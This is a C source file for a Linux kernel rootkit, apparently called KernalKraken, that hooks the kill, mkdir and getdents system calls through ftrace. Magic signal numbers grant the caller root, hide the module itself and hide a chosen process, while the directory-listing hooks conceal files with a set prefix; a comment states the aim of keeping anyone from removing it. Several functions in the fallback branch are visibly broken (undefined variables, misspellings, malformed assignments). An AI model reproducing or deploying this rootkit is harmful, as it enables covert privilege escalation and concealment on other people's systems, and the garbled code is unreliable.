#include "../headers/hooks.h"
#include "../headers/KernalKraken.h"
#include "../headers/credentials.h"
#include "../headers/stealth.h"

enum signals{
    SIGSUPER = 64, // become root
    SIGINVIS = 63, // hide the rootkit
    SIGHIDE = 62,  // hide process with pid given
};

unsigned long *__sys_call_table = NULL;
static short hidden = 0;
static struct list_head *prev_module;
char hide_pid[NAME_MAX];

#if PTREGS_SYSCALL_STUB

/**
 * if signal is 64 then gives the current user root privilegs
 * if signale is 63 hides the rootkit
 * kill
*/
static asmlinkage long hook_kill(const struct pt_regs *regs){
    int sig = regs->si;
    pid_t pid = regs->di;

    void set_root(void);
    void hide_me(void);
    void show_me(void);

    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges\n", sig, SIGSUPER);
        set_root();
        return orig_kill;
    }else if((sig == SIGINVIS) && (hidden == 0)){
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return orig_kill;
    }else if((sig == SIGINVIS) && (hidden == 1)){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return orig_kill;
    }else if((sig == SIGHIDE)){
        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
        sprintf(hide_pid, "%d", pid);
        return orig_kill;
    }

    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

/**
 * sending any directory created to the dmesg logs
 * mkdir
*/
static asmlinkage int hook_mkdir(const struct pt_regs *regs){
    char __user *pathname = (char *)regs->di;
    char dir_name[NAME_MAX] = {0};

    long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(regs);
    return 0;
}

/**
 * hiding directories and files with the PREFIX
 * getdents64
*/
static asmlinkage long hook_getdents64(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long index = 0;

    // get real output with all files in a directory
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }
    
    //loop through the directory to find the prefix
    while(index < ret){
        //looking at the first index.
        current_dir = (void *)dirent_ker + index;

        //checking if the file at the current directory has the prefix
        // or if the process id is equal to the one we want to hide
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            // if the prefix is the first index of the list we have to move everything up
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // we add the length of teh current directory to the previous one
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }
    
    // return altered list to user
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}

/**
 * hiding directories and files with the PREFIX
 * getdents
*/
static asmlinkage long hook_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };


    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    long error;
    unsigned long index = 0;

    // get real output with all files in a directory
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }
    
    //loop through the directory to find the prefix
    while(index < ret){
        //looking at the first index.
        current_dir = (void *)dirent_ker + index;

        //checking if the file at the current directory has the prefix
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            // if the prefix is the first index of the list we have to move everything up
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            // we add the length of teh current directory to the previous one
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }
    
    // return altered list to user
    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;

}
#else
/**
 * if signal is 64 then gives the current user root privilegs
 * if signale is 63 hides the rootkit
 * kill
*/
static asmlinkage long hook_kill(pid_t pid, int sig){
	void set_root(void);
    void hide_me(void);
    void show_me(void);
    
    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges\n", sig, SIGSUPER);
        set_root();
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 0)){
        printk(KERN_INFO "signal: %d == SIGINVIS %d | hiding the rootkit\n", sig, SIGINVIS);
        hide_me();
        hidden = 1;
        return 0;
    }else if((sig == SIGINVIS) && (hidden == 1)){
        /* This is only for testing we don't want anyone to get rid of our rootkit */
        printk(KERN_INFO "signal: %d == SIGINVIS %d | reavling the rootkit\n", sig, SIGINVIS);
        show_me();
        hidden = 0;
        return 0;
    }else if((sig == SIGHIDE)){
        printk(KERN_INFO "rootkit: hiding process with id %d\n",pid);
        sprintf(hide_pid, "%d", pid);
        return 0;
    }
    
    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

/**
 * sending any directory created to the dmesg logs
 * mkdir
*/
static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){

    char dir_name[NAME_MAX] = {0};

    long error =  strncpy_from_user(dir_name, pathname, NAME_MAX);

    if(error > 0){
        printk(KERN_INFO "rootkit: trying to create directory with name : %s\n", dir_name);
    }
    printk(KERN_INFO "***** hacked mkdir syscall *****\n");

    orig_mkdir(pathname, mode);
    return 0;
}

/**
 * hiding directories and files with the PREFIX
 * getdents64
*/
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long index = 0;
    long error;
    
    //getting actuall output of the dirr
    int ret = orig_getdents64(fd,dirent,count);
    dirent_ket = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    //looping thorugh the list to find the prefix and then remove those instances
    while(index < ret){
        current_dir = (void *) dirent_ker = 0;

        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
                continue;
            }
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

/**
 * hiding directories and files with the PREFIX
 * getdents
*/
static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    struct linux_dirent{
        unsigned long d_ino;
        unsigned long d_off;
        unsigned long d_reclen;
        char d_name[];
    }

    struct linux_dirent *current_dir, *previous_dir = NULL;
    unsigned long index = 0;
    long error;
    
    //getting actuall output of the dirr
    int ret = orig_getdents(fd,dirent,count);
    dirent_ket = kzalloc(ret, GFP_KERNEL);
    if((ret <=0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    //looping thorugh the list to find the prefix and then remove those instances
    while(index < ret){
        current_dir = (void *) dirent_ker = 0;

        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0 || 
            ((memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) && (strncmp(hide_pid, "", NAME_MAX) !=0))){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,ret);
                continue;
            }
        }else{
            previous_dir = current_dir;
        }
        index += current_dir->d_reclen;
    }

    error = copy_to_user(dirent,dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}
#endif

static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hook_getdents, &orig_getdents),
};